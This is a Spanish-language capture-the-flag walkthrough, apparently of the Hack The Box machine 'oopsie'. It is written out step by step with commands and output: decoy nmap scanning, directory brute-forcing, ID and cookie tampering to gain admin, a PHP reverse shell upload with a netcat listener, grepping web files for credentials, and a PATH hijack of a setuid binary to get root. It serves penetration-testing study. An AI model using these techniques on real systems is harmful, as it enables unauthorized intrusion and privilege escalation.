
1. [Enumeraion](#enumeration)
```bash
    sudo nmap -sC -sV -n -Pn --disable-arp-ping <IP_ADDRESS> -D RND:5 
    # PORT   STATE SERVICE REASON         VERSION
    # 22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    # 80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
```
- Se descubre que se está sirviendo un sitio por el puerto 80 el cual sugiere que nos autentiquemos.

2. [Explotación](#exploitation)
- Se decide hacer un escaneo con `gobuster` para descubrir rutas ocultas.

```bash
    gobuster dir -u http://<IP_ADDRESS>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,js -t 50
```
- No se encuentra nada relevante, lo que si se encuentra es un directorio `/uploads` el cual puede ser utilizado para subir archivos.
- Se decide utiliza una herramienta proxy com `Burp Suite` para interceptar la petición y analizarla. Se configura en Firefox `127.0.0.1:8080`.
- Se descubre que el sitio tiene una ruta para autenticar usuarios alojada en `/cdn-cgi/login/` la cual accedemos.
- Después de tratar una serie de combinaciones de usuario y contraseña, se decido autenticarse como `guest` ya que el mismo sitio lo sugiere.
- Necesitamos escalar los privilegios de `guest` a `admin` para lo cual revisamos las cookies y descubrimos que la cookie `role`=`guest` y `user`=`2233`.
- Revisando la URL notamos algo interesante, `http://10.129.89.154/cdn-cgi/login/admin.php?content=accounts&id=2`, lo que sugiere que el ID del usuario es `2` y el mismo tiene el rol de `guest`, por lo que decidimos cambiar el ID a `1` y recargar la página, descubriendo los datos del usuario `admin`. `role`=`admin` y `user`=`34322`.
- Con esta información, cambiamos los valores correspondientes en las cookies y recargamos la página, obteniendo acceso a la cuenta de `admin`.
- Con acceso a la cuenta de `admin`, se descubre que el sitio tiene una funcionalidad para subir archivos, por lo que decidimos subir una reverse shell basado en PHP.
- Abrimos un listener con `netcat` escuchando los puertos configurados en la reverse shell.

```bash
    nc -lvnp <REVERSE SHELL PORT>
```
- Activamos el reverse shell accediendo al archivo subido `http://<IP_ADDRESS>/uploads/shell.php` y obtenemos acceso a la máquina.
- Para mejorar la experiencia con la terminal, se decide utilizar `python` para obtener una pseudo terminal.

```bash
    python3 -c "import pty;pty.spawn('/bin/bash')"
    $ whoami
    # www-data
```

- Después de una enumeración se encuentran archivos interesantes en `/var/www/html/cdn-cgi/login/` y se utilizan patrones de búsqueda de posibles credenciales.

```bash
    cd /var/www/html/cdn-cgi/login/
    # Buscar posibles credenciales en archivos
    cat * | grep -i passw*
    # Ó hacer la búsqueda directamente en los archivos .php
    find . -type f -name "*.php" -exec cat {} \; | grep -i passw*
    find . -type f -name "*.php" -exec grep -i passw* {} \;
    # Identifica el nombre del archivo que contiene la posible contraseña
    grep -nrl "password" .
```

- Se encuentra un archivo llamado `db.php` el cual contiene una contraseña en texto plano de un usuario `robert`.
- Se hace una búsqueda en el archivo `/etc/passwd` y resulta que hay un usuario llamado `robert` con un shell de `/bin/bash`, lo que sugiere que es un usuario válido en el sistema.

```bash
    cat /etc/passwd 
    # .......
    # robert:x:1001:1001:Robert:/home/robert:/bin/bash
    # .......
```

- Cambiamos al usuario `robert` utilizando la contraseña encontrada y obtenemos acceso a su cuenta.

```bash
    su robert
    # Contraseña: <CONTRASEÑA ENCONTRADA>
    $ whoami
    # robert
```
- Comprobamos si el usuario `robert` tiene permisos de `sudo` y descubrimos que no tiene.

```bash
    sudo -l
    # Sorry , user robert may not run sudo on oopsie.
```:

- Se identifica los grupos a los que pertenece el usuario `robert` y se encuentra que pertenece al grupo `bugtracker`.

```bash
    id
    # uid=1001(robert) gid=1001(robert) groups=1001(robert),1002(bugtracker)
    # Ó
    groups
    # robert bugtracker
```

- Se hace una búsqueda en el sistema de archivos para identificar archivos relacionados con el grupo `bugtracker` y se encuentra un archivo llamado `bugtracker` con permisos de ejecución para el grupo `bugtracker`.

```bash
    find / -group bugtracker 2>/dev/null
    # .......
    # /home/robert/bugtracker
    # .......
```
- Se revisa los privilegios del archivo `bugtracker` y se encuentra que tiene establecido el bit `setuid` (-rw*s*r), lo que sugiere que se ejecuta con los privilegios del propietario del archivo, en este caso `root`.

```bash
    ls -l /home/robert/bugtracker
    # -rwsr-xr-x 1 root bugtracker 12345 Jan 1 12:00 /home/robert/bugtracker
```

- Se ejecuta el archivo para ver como se comporta y se encuentra que se hace un mal uso del comando `cat` para mostrar el contenido de un archivo, lo que sugiere que es vulnerable a una inyección de comandos.

```bash
    /home/robert/bugtracker
    # cat: /root/reports/11: No such file or directory
```
- Se crea dentro de la carpeta `tmp` un archivo con el nombre `cat` con el siguiente contenido:

```bash
    echo "/bin/sh" > /tmp/cat
    # Dar permisos de ejecución al archivo
    chmod +x /tmp/cat
```
- Se modifica la variable de entorno `PATH` para que el sistema busque primero en la carpeta `tmp` antes de buscar en las rutas por defecto.

```bash
    export PATH=/tmp:$PATH
    # Comprobar que el sistema ahora encuentra el archivo `cat` creado en la carpeta `tmp`
    echo $PATH
    # /tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
    # Ó
    which cat
    # /tmp/cat
```

- Se ejecuta nuevamente el archivo `bugtracker` y se obtiene una shell con privilegios de `root`.

```bash
    /home/robert/bugtracker
    # whoami
    # root
```

> Nota: Por qué funciona  esto?.
> El sistema busca los ejecutables en el orden definido por la variable `PATH`. Al colocar un archivo llamado `cat` en la carpeta `tmp` y modificar el `PATH` para que busque primero en `tmp`, cuando se ejecuta el comando `cat` dentro del programa `bugtracker`, en lugar de ejecutar el comando `cat` legítimo ubicado en `/bin/cat`, se ejecuta el archivo malicioso creado en `/tmp/cat`, que contiene una shell (`/bin/sh`). Dado que el programa `bugtracker` se ejecuta con privilegios de `root` debido al bit `setuid`, la shell obtenida también tiene privilegios de `root`, lo que permite al atacante obtener acceso completo al sistema.

3. [Post-explotación](#post-exploitation)

